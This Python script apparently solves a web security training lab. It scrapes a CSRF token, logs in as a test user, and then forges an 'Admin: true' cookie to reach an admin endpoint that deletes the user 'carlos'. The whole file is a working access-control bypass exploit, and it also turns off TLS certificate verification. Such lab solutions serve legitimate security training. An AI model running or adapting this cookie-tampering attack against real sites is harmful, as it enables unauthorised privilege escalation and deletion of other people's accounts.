import requests
import sys
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def csrf(session,url):
    requeste=session.get(url,verify=False)
    soup=BeautifulSoup(requeste.text,'html.parser')
    csrf_token_extracte=soup.find("input",{"name":"csrf"})["value"]
    return csrf_token_extracte

def delete_user(session,url):
    login_url=url+"login"
    csrf_token=csrf(session,login_url)
    print(csrf_token)

    #login
    data={"csrf":csrf_token,"username":"wiener","password":"peter"}

    request=session.post(login_url,data=data,verify=False,proxies=proxie)
    r=request.text
    
    if "Log out" in r:
        print('login seccessfuly')

        #get cookie
        cookie=session.cookies.get_dict().get('session')

        #delete user
        delete_user_url=url+"admin/delete?username=carlos"
        cookies={"session":cookie,"Admin":"true"}
        del_request=session.get(delete_user_url,cookies=cookies,verify=False)
        
        if del_request.status_code==200:
            print("(+) user deleted seccessfuly")
            print("(+) Congratulations, you solved the lab!")

        else:
            print('(+) error while deleted user')
            sys.exit(-1)
    else:
        print("not log in")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2 :
        print('(+) Usage %s <url>'  %sys.argv[0])
        print('(+) Example %s www.example.com'%sys.argv[0] )
    # session to keep login 
    session=requests.session()
    url=sys.argv[1]
    delete_user(session,url)

if __name__=="__main__":
    main()